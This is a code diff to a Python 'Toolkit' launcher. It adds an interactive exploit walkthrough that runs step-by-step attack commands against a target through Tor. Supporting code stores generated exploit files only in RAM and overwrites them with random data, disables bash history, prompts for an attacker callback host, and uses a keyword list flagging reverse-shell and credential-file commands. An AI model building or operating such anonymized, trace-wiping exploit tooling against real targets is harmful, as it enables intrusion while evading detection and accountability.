@@ -5,6 +5,7 @@ Toolkit — Interactive Launcher
 from __future__ import annotations
 import os, sys
 from pathlib import Path
+from typing import Optional
 
 # ── Auto-activate venv if available ─────────────────────────────────────────
 # The toolkit can be launched three ways:
@@ -63,9 +64,9 @@ if not _VENV_PY.exists() and not _system_has_deps():
     print(f"  [!] Run: bash install.sh")
     sys.exit(1)
 
-import json, subprocess, shutil, secrets, signal, threading
+import json, subprocess, shutil, secrets, signal, threading, time as _time_mod
 from decimal import Decimal, InvalidOperation
-from urllib.parse import urlparse
+from urllib.parse import urlparse, quote
 
 # ── Shutdown signal handling ───────────────────────────────────────────────
 _shutdown_event = threading.Event()
@@ -206,6 +207,580 @@ def run_script(path: Path, args: list, label: str = ""):
     except KeyboardInterrupt:
         warn("Interrupted")
         return False
+
+
+# ── Ephemeral File Manager ──────────────────────────────────────────────────
+
+class ExploitFileManager:
+    """RAM-only ephemeral file management with auto-cleanup and tracking.
+
+    All generated exploit files (clickjacking, CSRF, CORS, XSS, etc.) live
+    exclusively in /dev/shm when available, falling back to a tmpdir under
+    the toolkit root. Files are tracked for lifecycle management and wiped
+    on session close or after a configurable TTL.
+    """
+
+    def __init__(self, ttl_seconds: int = 300):
+        self._ttl = ttl_seconds
+        self._files: dict = {}  # path -> {created, type, ttl}
+        self._lock = threading.Lock()
+        if Path("/dev/shm").exists():
+            self._base = Path("/dev/shm/intel")
+        else:
+            self._base = ROOT / ".intel_tmp"
+        self._base.mkdir(parents=True, exist_ok=True)
+        self._disk_warning = not Path("/dev/shm").exists()
+
+    @property
+    def disk_warning(self) -> bool:
+        return self._disk_warning
+
+    @property
+    def base_dir(self) -> Path:
+        return self._base
+
+    def generate(self, exploit_type: str, content: str,
+                 extension: str = ".html", custom_name: str = "",
+                 ttl: int = None) -> Path:
+        """Generate an ephemeral exploit file in RAM.
+
+        Returns the Path to the generated file. The file is tracked for
+        auto-cleanup and its full path is never printed — only the filename.
+        """
+        if custom_name:
+            fname = custom_name
+        else:
+            tag = secrets.token_hex(4)
+            fname = f"{exploit_type}_{tag}{extension}"
+
+        out_path = self._base / fname
+        out_path.write_text(content)
+        os.chmod(str(out_path), 0o600)
+
+        file_ttl = ttl if ttl is not None else self._ttl
+        with self._lock:
+            self._files[str(out_path)] = {
+                "created": _time_mod.time(),
+                "type": exploit_type,
+                "ttl": file_ttl,
+                "filename": fname,
+                "size": len(content),
+            }
+        return out_path
+
+    def list_files(self) -> list:
+        """Return list of tracked file info dicts (no full paths exposed)."""
+        with self._lock:
+            result = []
+            for path_str, meta in self._files.items():
+                p = Path(path_str)
+                age = _time_mod.time() - meta["created"]
+                remaining = max(0, meta["ttl"] - age) if meta["ttl"] > 0 else -1
+                result.append({
+                    "filename": meta["filename"],
+                    "type": meta["type"],
+                    "size_bytes": meta["size"],
+                    "age_seconds": int(age),
+                    "ttl_remaining": int(remaining) if remaining >= 0 else "persistent",
+                    "exists": p.exists(),
+                })
+            return result
+
+    def cleanup_expired(self) -> int:
+        """Wipe files that have exceeded their TTL. Returns count wiped."""
+        now = _time_mod.time()
+        to_remove = []
+        with self._lock:
+            for path_str, meta in self._files.items():
+                if meta["ttl"] > 0 and (now - meta["created"]) > meta["ttl"]:
+                    to_remove.append(path_str)
+
+        count = 0
+        for path_str in to_remove:
+            count += self._secure_wipe(path_str)
+        return count
+
+    def wipe_all(self) -> int:
+        """Securely wipe ALL tracked files. Returns count wiped."""
+        with self._lock:
+            paths = list(self._files.keys())
+        count = 0
+        for path_str in paths:
+            count += self._secure_wipe(path_str)
+        return count
+
+    def wipe_by_type(self, exploit_type: str) -> int:
+        """Wipe all files of a given exploit type."""
+        with self._lock:
+            paths = [p for p, m in self._files.items() if m["type"] == exploit_type]
+        count = 0
+        for path_str in paths:
+            count += self._secure_wipe(path_str)
+        return count
+
+    def _secure_wipe(self, path_str: str) -> int:
+        """Overwrite file with random data, fsync, then unlink."""
+        p = Path(path_str)
+        try:
+            if p.exists():
+                size = p.stat().st_size
+                with open(p, "wb") as f:
+                    f.write(os.urandom(max(size, 64)))
+                    f.flush()
+                    os.fsync(f.fileno())
+                p.unlink()
+        except OSError:
+            pass
+        with self._lock:
+            self._files.pop(path_str, None)
+        return 1
+
+    def get_download_info(self, path: Path) -> str:
+        """Return display-safe info for a generated file (filename only)."""
+        return path.name
+
+    def session_destroy(self):
+        """Full session teardown: wipe all files and clear tracking."""
+        self.wipe_all()
+        with self._lock:
+            self._files.clear()
+
+
+# ── SOC-style Audit Trail ──────────────────────────────────────────────────
+
+class AuditTrail:
+    """In-memory audit trail for exploit walkthrough sessions.
+
+    Tracks every action (executions, skips, edits, file generations) with
+    timestamps, provides live feed capability, and supports export to
+    JSON/text reports. All data is held in memory only and wiped on
+    session close.
+    """
+
+    RISK_LOW = "LOW"
+    RISK_MEDIUM = "MEDIUM"
+    RISK_HIGH = "HIGH"
+    RISK_CRITICAL = "CRITICAL"
+
+    def __init__(self, session_id: str = ""):
+        self._session_id = session_id or secrets.token_hex(6)
+        self._entries: list = []
+        self._lock = threading.Lock()
+        self._start_time = _time_mod.time()
+        self._alerts: list = []
+
+    @property
+    def session_id(self) -> str:
+        return self._session_id
+
+    def log(self, action: str, detail: str = "", risk: str = "",
+            vuln_type: str = "", target: str = "", success: bool = None):
+        """Record an action in the audit trail."""
+        entry = {
+            "timestamp": _time_mod.time(),
+            "ts_iso": _time_mod.strftime("%Y-%m-%dT%H:%M:%S", _time_mod.gmtime()),
+            "action": action,
+            "detail": detail[:200] if detail else "",
+            "risk": risk,
+            "vuln_type": vuln_type,
+            "target": target[:80] if target else "",
+            "success": success,
+        }
+        with self._lock:
+            self._entries.append(entry)
+
+        if risk in (self.RISK_HIGH, self.RISK_CRITICAL):
+            self._alerts.append(entry)
+
+    def log_execution(self, command_preview: str, vuln_type: str,
+                      exit_code: int = None, risk: str = ""):
+        """Log a command execution event."""
+        self.log(
+            action="execute",
+            detail=f"cmd_preview: {command_preview[:60]}",
+            risk=risk or self.RISK_MEDIUM,
+            vuln_type=vuln_type,
+            success=exit_code == 0 if exit_code is not None else None,
+        )
+
+    def log_file_generated(self, filename: str, exploit_type: str):
+        """Log a file generation event."""
+        self.log(
+            action="file_generated",
+            detail=f"file: {filename}",
+            vuln_type=exploit_type,
+            success=True,
+        )
+
+    def log_skip(self, step_title: str, vuln_type: str = ""):
+        """Log a step skip."""
+        self.log(action="skip", detail=step_title, vuln_type=vuln_type)
+
+    def log_edit_run(self, custom_cmd_preview: str, vuln_type: str = ""):
+        """Log an edit+run action."""
+        self.log(
+            action="edit_run",
+            detail=f"custom: {custom_cmd_preview[:60]}",
+            risk=self.RISK_HIGH,
+            vuln_type=vuln_type,
+        )
+
+    def get_live_feed(self, last_n: int = 10) -> list:
+        """Return the most recent N entries for live display."""
+        with self._lock:
+            return list(self._entries[-last_n:])
+
+    def get_alerts(self) -> list:
+        """Return all high-risk alerts."""
+        return list(self._alerts)
+
+    def get_stats(self) -> dict:
+        """Return summary statistics for the session."""
+        with self._lock:
+            total = len(self._entries)
+            executions = sum(1 for e in self._entries if e["action"] == "execute")
+            skips = sum(1 for e in self._entries if e["action"] == "skip")
+            files = sum(1 for e in self._entries if e["action"] == "file_generated")
+            edits = sum(1 for e in self._entries if e["action"] == "edit_run")
+            successes = sum(1 for e in self._entries
+                           if e["action"] == "execute" and e.get("success") is True)
+            failures = sum(1 for e in self._entries
+                           if e["action"] == "execute" and e.get("success") is False)
+            vuln_types = set(e["vuln_type"] for e in self._entries if e["vuln_type"])
+
+        return {
+            "session_id": self._session_id,
+            "duration_seconds": int(_time_mod.time() - self._start_time),
+            "total_actions": total,
+            "executions": executions,
+            "successes": successes,
+            "failures": failures,
+            "skips": skips,
+            "files_generated": files,
+            "edits": edits,
+            "alerts": len(self._alerts),
+            "vuln_types_tested": sorted(vuln_types),
+        }
+
+    def export_report(self, fmt: str = "json") -> str:
+        """Export the audit trail as a report string.
+
+        Formats: 'json' or 'text'. The report is generated in memory
+        and never written to disk automatically.
+        """
+        stats = self.get_stats()
+        with self._lock:
+            entries_copy = list(self._entries)
+
+        if fmt == "json":
+            report = {
+                "report_type": "exploit_walkthrough_audit",
+                "session": stats,
+                "entries": entries_copy,
+                "alerts": list(self._alerts),
+            }
+            return json.dumps(report, indent=2)
+
+        lines = []
+        lines.append("=" * 60)
+        lines.append("EXPLOIT WALKTHROUGH AUDIT REPORT")
+        lines.append("=" * 60)
+        lines.append(f"Session ID: {stats['session_id']}")
+        lines.append(f"Duration:   {stats['duration_seconds']}s")
+        lines.append(f"Actions:    {stats['total_actions']}")
+        lines.append(f"Executions: {stats['executions']} "
+                      f"(success: {stats['successes']}, fail: {stats['failures']})")
+        lines.append(f"Skips:      {stats['skips']}")
+        lines.append(f"Files:      {stats['files_generated']}")
+        lines.append(f"Edit+Runs:  {stats['edits']}")
+        lines.append(f"Alerts:     {stats['alerts']}")
+        lines.append(f"Vuln Types: {', '.join(stats['vuln_types_tested'])}")
+        lines.append("-" * 60)
+        lines.append("")
+        lines.append("ACTION LOG")
+        lines.append("-" * 60)
+        for i, e in enumerate(entries_copy, 1):
+            risk_tag = f" [{e['risk']}]" if e.get("risk") else ""
+            status = ""
+            if e.get("success") is True:
+                status = " -> OK"
+            elif e.get("success") is False:
+                status = " -> FAIL"
+            lines.append(
+                f"  {i:>3}. [{e['ts_iso']}] {e['action']:16s}"
+                f"{risk_tag} {e.get('detail', '')}{status}"
+            )
+        if self._alerts:
+            lines.append("")
+            lines.append("HIGH-RISK ALERTS")
+            lines.append("-" * 60)
+            for a in self._alerts:
+                lines.append(f"  [{a['ts_iso']}] {a['action']}: {a.get('detail', '')}")
+        lines.append("")
+        lines.append("=" * 60)
+        return "\n".join(lines)
+
+    def session_destroy(self):
+        """Wipe all audit data from memory."""
+        with self._lock:
+            self._entries.clear()
+        self._alerts.clear()
+        self._session_id = ""
+        self._start_time = 0
+
+
+# ── Safe Executor ──────────────────────────────────────────────────────────
+
+class SafeExecutor:
+    """Command execution with safety confirmations, risk assessment,
+    rate limiting, and automatic timeout enforcement.
+
+    Risk levels determine the confirmation flow:
+    - LOW: single confirmation
+    - MEDIUM: single confirmation + warning
+    - HIGH: double confirmation + warning + delay
+    - CRITICAL: double confirmation + explicit warning + extended delay
+    """
+
+    RISK_COMMANDS = {
+        "reverse_shell": "CRITICAL",
+        "credential_dump": "CRITICAL",
+        "file_write": "HIGH",
+        "data_exfil": "HIGH",
+        "rce": "CRITICAL",
+        "sqli_extract": "HIGH",
+        "default": "MEDIUM",
+    }
+
+    def __init__(self, audit: AuditTrail, tor_proxy: str = ""):
+        self._audit = audit
+        self._tor_proxy = tor_proxy
+        self._exec_count = 0
+        self._exec_times: list = []
+        self._rate_limit_window = 60
+        self._rate_limit_max = 20
+        self._lock = threading.Lock()
+
+    def _assess_risk(self, command: str, step: dict) -> str:
+        """Assess the risk level of a command based on content analysis."""
+        cmd_lower = command.lower()
+        if any(k in cmd_lower for k in ("/dev/tcp", "reverse", "nc -", "ncat", "bash -i")):
+            return "CRITICAL"
+        if any(k in cmd_lower for k in ("password", "credential", "shadow", "id_rsa",
+                                         "security-credentials")):
+            return "HIGH"
+        if step.get("warning"):
+            return "HIGH"
+        if any(k in cmd_lower for k in ("union select", "group_concat", "information_schema")):
+            return "HIGH"
+        return step.get("risk", "MEDIUM")
+
+    def _check_rate_limit(self) -> bool:
+        """Enforce rate limiting on command executions."""
+        now = _time_mod.time()
+        with self._lock:
+            self._exec_times = [t for t in self._exec_times
+                                if now - t < self._rate_limit_window]
+            if len(self._exec_times) >= self._rate_limit_max:
+                return False
+            self._exec_times.append(now)
+            self._exec_count += 1
+        return True
+
+    def execute(self, command: str, step: dict, vuln_type: str = "",
+                timeout: int = 30) -> Optional[subprocess.CompletedProcess]:
+        """Execute a command with full safety pipeline.
+
+        Returns the CompletedProcess result or None if aborted/failed.
+        """
+        risk = self._assess_risk(command, step)
+
+        if not self._check_rate_limit():
+            warn(f"Rate limit reached ({self._rate_limit_max} commands/"
+                 f"{self._rate_limit_window}s). Wait before executing more.")
+            return None
+
+        if risk == "CRITICAL":
+            print(f"  {R}{'=' * 50}{N}")
+            print(f"  {R}CRITICAL RISK: This action could be dangerous{N}")
+            print(f"  {R}{'=' * 50}{N}")
+            if step.get("warning"):
+                print(f"  {R}Detail: {step['warning']}{N}")
+            print()
+            if not confirm("FIRST CONFIRMATION: Understand the risks?"):
+                info("Aborted.")
+                self._audit.log("abort", f"critical_risk_rejected: {command[:40]}", risk=risk)
+                return None
+            _time_mod.sleep(1 + secrets.randbelow(2))
+            if not confirm("SECOND CONFIRMATION: Execute this critical command?"):
+                info("Aborted.")
+                self._audit.log("abort", f"critical_risk_rejected_2nd: {command[:40]}", risk=risk)
+                return None
+        elif risk == "HIGH":
+            if step.get("warning"):
+                print(f"  {Y}WARNING: {step['warning']}{N}")
+            if not confirm(f"Execute this HIGH-risk command?"):
+                info("Aborted.")
+                self._audit.log("abort", f"high_risk_rejected: {command[:40]}", risk=risk)
+                return None
+            _time_mod.sleep(0.5 + secrets.randbelow(2))
+        else:
+            if not confirm("CONFIRM: Execute this command through Tor?"):
+                info("Aborted.")
+                return None
+
+        info("Rotating Tor circuit...")
+        _time_mod.sleep(1 + secrets.randbelow(3))
+
+        _safe_env = {k: v for k, v in os.environ.items()
+                     if k not in ("GS_WALLET_PASSWORD", "GS_WALLET_FILE",
+                                  "HIBP_KEY", "DEHASHED_KEY", "DEHASHED_EMAIL",
+                                  "COINGECKO_API_KEY")}
+        _safe_env["HISTFILE"] = "/dev/null"
+
+        try:
+            result = subprocess.run(
+                ["bash", "--norc", "--noprofile", "-c", command],
+                capture_output=True, text=True, timeout=timeout,
+                env=_safe_env,
+            )
+            if result.stdout:
+                print(f"\n  {G}Output:{N}")
+                for line in result.stdout.strip().split("\n")[:20]:
+                    print(f"    {line}")
+            if result.stderr:
+                print(f"\n  {Y}Stderr:{N}")
+                for line in result.stderr.strip().split("\n")[:5]:
+                    print(f"    {line}")
+
+            self._audit.log_execution(
+                command[:60], vuln_type,
+                exit_code=result.returncode, risk=risk,
+            )
+            ok(f"Executed (exit code: {result.returncode})")
+            return result
+
+        except subprocess.TimeoutExpired:
+            warn(f"Command timed out ({timeout}s)")
+            self._audit.log_execution(command[:60], vuln_type, exit_code=-1, risk=risk)
+            return None
+        except Exception as e:
+            err(f"Execution failed: {type(e).__name__}")
+            self._audit.log_execution(command[:60], vuln_type, exit_code=-1, risk=risk)
+            return None
+
+    @property
+    def execution_count(self) -> int:
+        return self._exec_count
+
+
+# ── Report Generator ───────────────────────────────────────────────────────
+
+class ReportGenerator:
+    """Generate exportable audit reports from walkthrough sessions.
+
+    Supports JSON and text formats. Reports are generated in memory
+    and can be saved to the ephemeral file manager for secure handling.
+    """
+
+    @staticmethod
+    def generate(audit: AuditTrail, file_mgr: ExploitFileManager,
+                 fmt: str = "text",
+                 findings_summary: list = None) -> str:
+        """Generate a full session report."""
+        stats = audit.get_stats()
+        report_lines = []
+
+        if fmt == "json":
+            report_data = {
+                "report_type": "exploit_walkthrough_session",
+                "session": stats,
+                "findings_tested": findings_summary or [],
+                "files_generated": file_mgr.list_files(),
+                "audit_entries": audit.get_live_feed(last_n=9999),
+                "alerts": audit.get_alerts(),
+            }
+            return json.dumps(report_data, indent=2)
+
+        report_lines.append("=" * 65)
+        report_lines.append("  EXPLOIT WALKTHROUGH SESSION REPORT")
+        report_lines.append("=" * 65)
+        report_lines.append(f"  Session:   {stats['session_id']}")
+        report_lines.append(f"  Duration:  {stats['duration_seconds']}s")
+        report_lines.append(f"  Generated: {_time_mod.strftime('%Y-%m-%d %H:%M UTC', _time_mod.gmtime())}")
+        report_lines.append("")
+        report_lines.append("  SUMMARY")
+        report_lines.append("  " + "-" * 40)
+        report_lines.append(f"  Total actions:    {stats['total_actions']}")
+        report_lines.append(f"  Executions:       {stats['executions']}")
+        report_lines.append(f"    Successful:     {stats['successes']}")
+        report_lines.append(f"    Failed:         {stats['failures']}")
+        report_lines.append(f"  Steps skipped:    {stats['skips']}")
+        report_lines.append(f"  Files generated:  {stats['files_generated']}")
+        report_lines.append(f"  Custom commands:  {stats['edits']}")
+        report_lines.append(f"  High-risk alerts: {stats['alerts']}")
+        report_lines.append(f"  Vuln types:       {', '.join(stats['vuln_types_tested'])}")
+        report_lines.append("")
+
+        tracked = file_mgr.list_files()
+        if tracked:
+            report_lines.append("  GENERATED FILES")
+            report_lines.append("  " + "-" * 40)
+            for fi in tracked:
+                status = "active" if fi["exists"] else "wiped"
+                report_lines.append(
+                    f"  {fi['filename']:30s}  {fi['type']:15s}  "
+                    f"{fi['size_bytes']:>6d}B  [{status}]"
+                )
+            report_lines.append("")
+
+        if findings_summary:
+            report_lines.append("  FINDINGS TESTED")
+            report_lines.append("  " + "-" * 40)
+            for f in findings_summary:
+                report_lines.append(
+                    f"  [{f.get('severity', '?'):8s}] {f.get('type', '?'):15s}  "
+                    f"{f.get('title', '?')[:40]}"
+                )
+            report_lines.append("")
+
+        alerts = audit.get_alerts()
+        if alerts:
+            report_lines.append("  HIGH-RISK ALERTS")
+            report_lines.append("  " + "-" * 40)
+            for a in alerts:
+                report_lines.append(f"  [{a['ts_iso']}] {a['action']}: {a.get('detail', '')}")
+            report_lines.append("")
+
+        report_lines.append("  DETAILED ACTION LOG")
+        report_lines.append("  " + "-" * 40)
+        for i, e in enumerate(audit.get_live_feed(last_n=9999), 1):
+            risk_tag = f" [{e['risk']}]" if e.get("risk") else ""
+            status = ""
+            if e.get("success") is True:
+                status = " OK"
+            elif e.get("success") is False:
+                status = " FAIL"
+            report_lines.append(
+                f"  {i:>3}. [{e['ts_iso']}] {e['action']:16s}"
+                f"{risk_tag} {e.get('detail', '')}{status}"
+            )
+
+        report_lines.append("")
+        report_lines.append("=" * 65)
+        return "\n".join(report_lines)
+
+    @staticmethod
+    def save_report(report_content: str, file_mgr: ExploitFileManager,
+                    fmt: str = "text") -> Path:
+        """Save a report using the file manager (ephemeral, RAM-only)."""
+        ext = ".json" if fmt == "json" else ".txt"
+        return file_mgr.generate(
+            exploit_type="audit_report",
+            content=report_content,
+            extension=ext,
+            ttl=600,
+        )
 
 
 # ── Check prerequisites ────────────────────────────────────────────────────
@@ -992,16 +1567,24 @@ def _load_latest_report(ram_dir: Path) -> Optional[dict]:
 
 
 def _intel_exploit_walkthrough(tor_proxy: str):
-    """Interactive step-by-step exploit walkthrough with execution support.
+    """Interactive step-by-step exploit walkthrough with full automation.
+
+    Features:
+    - Ephemeral file management (RAM-only, auto-cleanup)
+    - SOC-style audit trail with real-time logging
+    - Safe execution with risk assessment and rate limiting
+    - Comprehensive payload generation for all exploit types
+    - Session report generation and export
+    - Full session wipe on exit
 
     For each exploitable finding:
     - Shows the vulnerability details and impact
     - Presents multi-step PoC with individual step confirmation
-    - Allows custom parameter input for each step
+    - Allows custom parameter input and URL overrides
     - Executes commands through Tor with safety confirmations
-    - Tracks which steps have been completed
+    - Generates exploit files automatically (ephemeral)
+    - Tracks all actions in the audit trail
     """
-    import time as _t
 
     ram_dir = Path("/dev/shm/intel") if Path("/dev/shm/intel").exists() else ROOT / ".intel_tmp"
     if not ram_dir.exists():
@@ -1021,21 +1604,42 @@ def _intel_exploit_walkthrough(tor_proxy: str):
         info(f"Total findings: {len(vulns)}")
         return
 
-    # Extract base URL for building commands
+    # ── Initialize session subsystems ──
+    file_mgr = ExploitFileManager(ttl_seconds=300)
+    audit = AuditTrail()
+    executor = SafeExecutor(audit, tor_proxy)
+
+    if file_mgr.disk_warning:
+        print(f"  {R}WARNING: /dev/shm not available — files stored on disk, not RAM.{N}")
+        print(f"  {R}Use a system with tmpfs for OPSEC-safe operation.{N}")
+        print()
+
     base_url = _extract_base_url_from_vulns(vulns) or "[TARGET]"
     _proxy_port = urlparse(tor_proxy).port or 9050
     _sp = f"--socks5-hostname 127.0.0.1:{_proxy_port}"
 
+    audit.log("session_start", f"target: {base_url}, findings: {len(exploitable)}")
+
     heading("Exploit Walkthrough")
-    print(f"  {B}{len(exploitable)}{N} exploitable vulnerabilities found.")
-    print(f"  Base URL: {B}{base_url}{N}")
+    print(f"  {B}Session:{N} {audit.session_id}")
+    print(f"  {B}Findings:{N} {len(exploitable)} exploitable vulnerabilities")
+    print(f"  {B}Base URL:{N} {base_url}")
+    print(f"  {B}File TTL:{N} {file_mgr._ttl}s (auto-cleanup)")
+    print(f"  {B}Storage:{N}  {'RAM (/dev/shm)' if not file_mgr.disk_warning else 'DISK (no /dev/shm)'}")
     print()
 
-    # Sort by severity: CRITICAL first
+    # Allow target URL override
+    custom_url = prompt("Override target URL (or Enter to use detected)", "")
+    if custom_url.strip():
+        base_url = custom_url.strip()
+        audit.log("url_override", f"target changed to: {base_url[:60]}")
+        ok(f"Target URL set to: {base_url}")
+        print()
+
     sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
     exploitable.sort(key=lambda v: sev_order.get(v.get("severity", ""), 5))
 
-    # Show summary table first
+    # Summary table
     print(f"  {'#':>3}  {'Sev':8}  {'Type':20}  Title")
     print(f"  {'─' * 70}")
     for i, v in enumerate(exploitable):
@@ -1047,6 +1651,7 @@ def _intel_exploit_walkthrough(tor_proxy: str):
 
     sel = prompt("Enter number to explore (or 'all' for sequential, 'q' to quit)", "all")
     if sel.lower() in ("q", "quit"):
+        _walkthrough_cleanup(file_mgr, audit, executor)
         return
 
     if sel.isdigit():
@@ -1055,13 +1660,18 @@ def _intel_exploit_walkthrough(tor_proxy: str):
             targets = [exploitable[idx]]
         else:
             err(f"Invalid number: {sel}")
+            _walkthrough_cleanup(file_mgr, audit, executor)
             return
     else:
         targets = exploitable
 
+    findings_summary = []
+
     for vi, v in enumerate(targets):
         if shutdown_requested():
             break
+
+        file_mgr.cleanup_expired()
 
         sev = v.get("severity", "?")
         color = {"CRITICAL": R, "HIGH": R, "MEDIUM": Y, "LOW": C}.get(sev, D)
@@ -1070,6 +1680,13 @@ def _intel_exploit_walkthrough(tor_proxy: str):
         etype = ei.get("type", "unknown")
         param = ei.get("parameter", "")
         test_url = v.get("test_url", base_url)
+
+        findings_summary.append({
+            "severity": sev, "type": etype,
+            "title": v.get("title", "?")[:60],
+        })
+        audit.log("finding_start", f"{etype}: {v.get('title', '?')[:50]}",
+                  vuln_type=etype, risk=sev)
 
         # ── Finding Header ──
         print(f"\n  {'═' * 65}")
@@ -1086,14 +1703,13 @@ def _intel_exploit_walkthrough(tor_proxy: str):
             print(f"  {B}Test URL:{N}   {test_url}")
         print()
 
-        # ── Build Steps ──
         steps = _build_exploit_steps(etype, param, ei, test_url, base_url, _sp)
 
-        # ── Step-by-Step Execution ──
         print(f"  {B}Exploitation Steps ({len(steps)}):{N}")
         print()
 
         step_idx = 0
+        action = ""
         while step_idx < len(steps):
             if shutdown_requested():
                 break
@@ -1112,38 +1728,63 @@ def _intel_exploit_walkthrough(tor_proxy: str):
 
             while True:
                 print(f"    {G}r{N}=run  {G}e{N}=edit+run  {G}s{N}=skip step  "
-                      f"{G}n{N}=next finding  {G}q{N}=quit")
+                      f"{G}n{N}=next finding  {G}d{N}=download files  "
+                      f"{G}a{N}=audit log  {G}q{N}=quit")
                 action = prompt(f"  Step {step_num}", "r").lower()
 
                 if action in ("q", "quit"):
-                    info("Walkthrough ended.")
+                    audit.log("session_end", "user_quit")
+                    _walkthrough_session_end(file_mgr, audit, executor,
+                                            findings_summary)
                     return
 
                 if action in ("n", "next"):
+                    audit.log_skip(f"finding_{vi+1}_remaining_steps", etype)
                     break
 
                 if action in ("s", "skip"):
                     info(f"Skipped step {step_num}")
+                    audit.log_skip(step["title"], etype)
                     step_idx += 1
                     break
 
-                if action in ("r", "run"):
-                    if step.get("warning"):
-                        if not confirm(f"  {step['warning']} Proceed?"):
-                            info("Aborted.")
-                            continue
+                if action in ("d", "download"):
+                    _show_tracked_files(file_mgr)
+                    continue
 
-                    # File-generation steps: write the file automatically
+                if action in ("a", "audit"):
+                    _show_live_audit(audit)
+                    continue
+
+                if action in ("r", "run"):
                     if step.get("generate_file"):
                         finfo = step["generate_file"]
-                        out_dir = Path("/dev/shm/intel") if Path("/dev/shm").exists() else ROOT / ".intel_tmp"
-                        out_dir.mkdir(parents=True, exist_ok=True)
-                        out_path = out_dir / finfo["filename"]
-                        out_path.write_text(finfo["content"])
-                        os.chmod(str(out_path), 0o600)
-                        ok(f"File generated: {out_path.name} (in intel dir)")
+                        content = finfo["content"]
+
+                        # Variable substitution for custom target URLs
+                        if "[TARGET_URL]" in content:
+                            custom_target = prompt(
+                                "Target URL for payload", test_url)
+                            content = content.replace("[TARGET_URL]",
+                                                      custom_target)
+                        if "[ATTACKER]" in content:
+                            attacker = prompt(
+                                "Attacker callback URL/IP", "https://ATTACKER")
+                            content = content.replace("[ATTACKER]", attacker)
+                            content = content.replace("https://ATTACKER",
+                                                      attacker)
+
+                        out_path = file_mgr.generate(
+                            exploit_type=etype,
+                            content=content,
+                            custom_name=finfo.get("filename", ""),
+                        )
+                        ok(f"File generated: {out_path.name}")
+                        info(f"Location: intel ephemeral dir (auto-wipes in "
+                             f"{file_mgr._ttl}s)")
                         if finfo.get("note"):
                             info(finfo["note"])
+                        audit.log_file_generated(out_path.name, etype)
                         print()
                         step_idx += 1
                         break
@@ -1151,42 +1792,20 @@ def _intel_exploit_walkthrough(tor_proxy: str):
                     cmd = step["command"]
                     if cmd.startswith("#") or cmd.startswith("<!--"):
                         info("This step is informational (no executable command).")
+                        audit.log("info_step", step["title"], vuln_type=etype)
                         step_idx += 1
                         break
 
-                    info(f"Rotating Tor circuit...")
-                    _t.sleep(1 + secrets.randbelow(3))
+                    # Variable substitution in commands
+                    if "[ATTACKER]" in cmd:
+                        attacker = prompt("Attacker IP/domain for callback",
+                                          "ATTACKER")
+                        cmd = cmd.replace("[ATTACKER]", attacker)
+                        cmd = cmd.replace("ATTACKER", attacker)
 
-                    if not confirm("CONFIRM: Execute this command through Tor?"):
-                        info("Aborted.")
-                        continue
-
-                    # Sanitized env: strip secrets, proxy vars, wallet info
-                    _safe_env = {k: v for k, v in os.environ.items()
-                                 if k not in ("GS_WALLET_PASSWORD", "GS_WALLET_FILE",
-                                              "HIBP_KEY", "DEHASHED_KEY", "DEHASHED_EMAIL",
-                                              "COINGECKO_API_KEY")}
-                    _safe_env["HISTFILE"] = "/dev/null"  # prevent bash history
-
-                    try:
-                        result = subprocess.run(
-                            ["bash", "--norc", "--noprofile", "-c", cmd],
-                            capture_output=True, text=True, timeout=30,
-                            env=_safe_env,
-                        )
-                        if result.stdout:
-                            print(f"\n  {G}Output:{N}")
-                            for line in result.stdout.strip().split("\n")[:20]:
-                                print(f"    {line}")
-                        if result.stderr:
-                            print(f"\n  {Y}Stderr:{N}")
-                            for line in result.stderr.strip().split("\n")[:5]:
-                                print(f"    {line}")
-                        ok(f"Step {step_num} executed (exit code: {result.returncode})")
-                    except subprocess.TimeoutExpired:
-                        warn("Command timed out (30s)")
-                    except Exception as e:
-                        err(f"Execution failed: {type(e).__name__}")
+                    result = executor.execute(cmd, step, vuln_type=etype)
+                    if result is not None:
+                        ok(f"Step {step_num} complete")
                     print()
                     step_idx += 1
                     break
@@ -1198,29 +1817,14 @@ def _intel_exploit_walkthrough(tor_proxy: str):
                     custom = prompt("Enter command to execute", default_cmd)
                     if not custom or custom.startswith("#"):
                         info("No executable command entered — skipping step")
+                        audit.log_skip(f"edit_empty:{step['title']}", etype)
                         step_idx += 1
                         break
                     if not confirm(f"Execute: {custom[:80]}... ?"):
                         continue
-                    _safe_env = {k: v for k, v in os.environ.items()
-                                 if k not in ("GS_WALLET_PASSWORD", "GS_WALLET_FILE",
-                                              "HIBP_KEY", "DEHASHED_KEY", "DEHASHED_EMAIL")}
-                    _safe_env["HISTFILE"] = "/dev/null"
-                    try:
-                        result = subprocess.run(
-                            ["bash", "--norc", "--noprofile", "-c", custom],
-                            capture_output=True, text=True, timeout=30,
-                            env=_safe_env,
-                        )
-                        if result.stdout:
-                            print(f"\n  {G}Output:{N}")
-                            for line in result.stdout.strip().split("\n")[:20]:
-                                print(f"    {line}")
-                        ok(f"Custom command executed (exit code: {result.returncode})")
-                    except subprocess.TimeoutExpired:
-                        warn("Command timed out (30s)")
-                    except Exception as e:
-                        err(f"Execution failed: {type(e).__name__}")
+
+                    audit.log_edit_run(custom[:60], etype)
+                    result = executor.execute(custom, step, vuln_type=etype)
                     step_idx += 1
                     break
 
@@ -1229,163 +1833,645 @@ def _intel_exploit_walkthrough(tor_proxy: str):
 
         if len(targets) > 1 and vi < len(targets) - 1:
             print()
+            # Show mini status between findings
+            stats = audit.get_stats()
+            print(f"  {D}[Session: {stats['executions']} executed, "
+                  f"{stats['files_generated']} files, "
+                  f"{stats['skips']} skipped]{N}")
             if not confirm("Continue to next finding?"):
                 break
 
+    _walkthrough_session_end(file_mgr, audit, executor, findings_summary)
+
+
+def _show_tracked_files(file_mgr: ExploitFileManager):
+    """Display currently tracked ephemeral files."""
+    files = file_mgr.list_files()
+    if not files:
+        info("No files currently tracked.")
+        return
+    print(f"\n  {B}Tracked Ephemeral Files:{N}")
+    print(f"  {'─' * 55}")
+    for f in files:
+        status = f"{G}active{N}" if f["exists"] else f"{R}wiped{N}"
+        ttl_str = (f"{f['ttl_remaining']}s left"
+                   if isinstance(f["ttl_remaining"], int) else "persistent")
+        print(f"  {f['filename']:30s}  {f['type']:12s}  "
+              f"{f['size_bytes']:>5d}B  {status}  {ttl_str}")
     print()
-    ok("Exploit walkthrough complete.")
-    info("Run Intel mode 7 (Wipe Intel Data) to securely erase all findings and exploit files.")
+
+
+def _show_live_audit(audit: AuditTrail):
